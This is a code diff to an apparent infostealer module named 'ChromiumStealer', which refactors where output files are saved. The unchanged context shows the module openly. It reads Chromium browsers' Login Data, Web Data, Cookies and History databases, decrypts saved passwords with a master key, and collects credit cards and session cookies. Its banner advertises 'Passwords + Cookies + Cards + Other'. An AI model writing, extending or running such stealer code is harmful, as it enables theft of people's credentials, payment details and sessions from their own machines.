@@ -45,7 +45,7 @@ from config import ModuleManager
 class ChromiumRecovery(ModuleManager):
 
     def __init__(self) -> None:
-        super().__init__(module_name="ChromiumStealer")
+        super().__init__(module_name="ChromiumStealer", module_path="browsers/chromium")
 
         self.banner(r"""
      _______         _______ _                      _             
@@ -57,8 +57,6 @@ class ChromiumRecovery(ModuleManager):
   |:::::::::::|\    
   `-=========-`()        Passwords + Cookies + Cards + Other
               """)
-
-        self.browsers_folder = self.output_folder_user / 'browsers'
 
         appdata = os.getenv('LOCALAPPDATA')
         self.browsers = {
@@ -107,7 +105,7 @@ class ChromiumRecovery(ModuleManager):
         return decrypted_pass
 
     def save_results(self, browser_name, data_type, content, profile) -> None:
-        save_path = os.path.join(self.browsers_folder, browser_name, profile)
+        save_path = os.path.join(self.module_output, browser_name, profile)
 
         if not os.path.isdir(save_path):
             os.makedirs(save_path)
@@ -129,7 +127,7 @@ class ChromiumRecovery(ModuleManager):
     def __get_login_data(self, path: str, profile: str, master_key: bytes, browser_name: str) -> str:
         result = ""
         login_db = f'{path}\\{profile}\\Login Data'
-        copy_path = os.path.join(self.browsers_folder, browser_name, profile)
+        copy_path = os.path.join(self.module_output, browser_name, profile)
 
         if not os.path.exists(login_db):
             self.mdebug(f"[{browser_name}] [{profile}] [passwords] Login data doesn't exist at {login_db}")
@@ -172,7 +170,7 @@ class ChromiumRecovery(ModuleManager):
     def __get_credit_cards(self, path: str, profile: str, master_key: bytes, browser_name: str) -> str:
         result = ""
         cards_db = f'{path}\\{profile}\\Web Data'
-        copy_path = os.path.join(self.browsers_folder, browser_name, profile)
+        copy_path = os.path.join(self.module_output, browser_name, profile)
 
         if not os.path.exists(cards_db):
             self.mdebug(f"[{browser_name}] [{profile}] [cards] Web data doesn't exist at {cards_db}")
@@ -217,7 +215,7 @@ class ChromiumRecovery(ModuleManager):
     def __get_cookies(self, path: str, profile: str, master_key: bytes, browser_name: str) -> str:
         result = ""
         cookie_db = f'{path}\\{profile}\\Network\\Cookies'
-        copy_path = os.path.join(self.browsers_folder, browser_name, profile)
+        copy_path = os.path.join(self.module_output, browser_name, profile)
 
         if not os.path.exists(cookie_db):
             self.mdebug(f"[{browser_name}] [{profile}] [cookies] Login data doesn't exist at {cookie_db}")
@@ -264,7 +262,7 @@ class ChromiumRecovery(ModuleManager):
     def __get_web_history(self, path: str, profile: str, browser_name: str) -> str:
         result = ""
         web_history_db = f'{path}\\{profile}\\History'
-        copy_path = os.path.join(self.browsers_folder, browser_name, profile)
+        copy_path = os.path.join(self.module_output, browser_name, profile)
 
         if not os.path.exists(web_history_db):
             self.mdebug(f"[{browser_name}] [{profile}] [history] Hisory data doesn't exist at {web_history_db}")
